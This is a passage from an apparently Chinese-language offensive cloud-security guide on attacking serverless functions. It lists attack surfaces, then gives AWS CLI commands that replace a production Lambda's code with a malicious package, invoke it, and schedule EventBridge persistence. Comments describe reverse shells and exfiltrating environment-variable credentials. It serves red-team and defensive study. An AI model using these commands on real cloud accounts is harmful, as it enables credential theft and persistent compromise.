## 七、Serverless 与云函数攻击

### 7.1 云函数攻击面总览（Lambda/FC/Cloud Functions/Azure Functions）

```
1. 环境变量泄露（AK/SK、数据库连接串、第三方API key——最常被忽略的高价值资产）
2. 过度权限的执行角色（函数角色=提权跳板，8分钟攻击案例的核心载体）
3. 依赖包/层投毒（供应链：恶意依赖在函数执行时触发）
4. 事件源注入（S3事件/SQS/API Gateway/定时触发器注入恶意负载）
5. /tmp 目录残留（临时凭据、处理中的敏感文件跨调用残留）
6. Lambda 层（Layer）投毒：覆盖业务代码的共享层
7. 函数代码/配置可被外部修改（lambda:UpdateFunctionCode/Configuration）
8. 并发与配额滥用（DDoS/资源耗尽）
```

### 7.2 Lambda 注入与代码执行链

```bash
# 攻击链：有lambda:CreateFunction/UpdateFunctionCode + iam:PassRole（或函数角色本身弱）
# 1. 制作恶意函数（反弹Shell/读取环境变量并回传）
# 2. 创建或更新函数（注入到现有函数更隐蔽——被更新的是生产函数）
aws lambda update-function-code --function-name <target> --zip-file fileb://pwn.zip
# 3. 用原有事件源触发 或 直接Invoke
aws lambda invoke --function-name <target> out.json

# 通过函数窃取环境变量
# handler中: os.environ 打包外传（HTTP/DNS外带）

# EventBridge 定时触发持久化
aws events put-rule --name pwn --schedule-expression "rate(6 hours)"
aws events put-targets --rule pwn --targets "[{\"Id\":\"1\",\"Arn\":\"arn:aws:lambda:...:function:pwn\"}]"

# 阿里云FC 类似：service/function 更新代码 + 触发器
# GCP Cloud Functions：functions.source.update + iam.serviceAccounts.actAs
```

### 7.3 事件源注入攻击面
```
1. S3事件触发：上传恶意对象到桶 → 触发函数处理 → 注入恶意文件名/内容（路径遍历/命令注入）
2. SQS消息：构造恶意消息体 → 函数消费时触发注入
3. API Gateway：HTTP请求头/体注入函数参数
4. 定时触发器：若函数依赖外部URL（拉取配置），利用函数SSRF或供应链劫持
5. 事件负载注入 → 反序列化/模板注入（函数内处理不可信数据）
```

